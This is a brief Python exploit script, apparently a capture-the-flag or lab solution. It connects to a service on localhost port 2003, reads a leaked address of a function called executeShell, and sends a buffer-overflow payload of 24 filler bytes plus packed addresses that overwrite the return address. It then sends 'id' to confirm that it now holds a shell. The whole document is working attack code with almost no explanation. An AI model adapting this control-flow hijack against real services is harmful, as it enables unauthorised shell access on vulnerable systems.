import socket
import struct
import time

# open a connection
s = socket.create_connection(('localhost', 2003))

# read the reply; value of func
l = s.recv(31)
print(l)
func = int(l.split()[-1].decode()[2:], 16)

 # Same address this time
new = func
print("location of executeShell:",  hex(new))

# construct the full payload
payload = b'A'*24 + struct.pack('QQ', new-1, new)
print(payload)

l = s.recv(9999)
print(l) # enter your data
s.send(payload + b'\n')

# No reply sent, so just wait a bit
time.sleep(1)

# now we should be executing the function executeShell! :D
s.send(b'id\n')
print(s.recv(999))
